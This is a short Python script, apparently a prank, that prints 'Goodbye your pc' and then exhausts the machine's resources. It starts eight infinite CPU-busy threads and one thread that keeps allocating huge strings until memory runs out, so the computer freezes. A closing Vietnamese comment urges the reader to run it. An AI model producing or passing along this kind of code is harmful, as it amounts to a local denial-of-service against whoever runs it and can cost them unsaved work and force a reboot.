import threading
print(
    "Goodbye your pc"
)
print("...............")
input(
    "Stand for freeze "
    "................."
)
A = []
def burn_cpu():
  x = 0
  while True:
    x += 1
def burn_ram():
  while True:
    try:
      A.append("Goodbye" * 10**8)
    except:
      pass
print("\nGoodbye_pc")
for i in range(8):  
  threading.Thread(target=burn_cpu, daemon=True).start()
threading.Thread(target=burn_ram, daemon=True).start()
while True:
  pass
# chạy cái này đi #
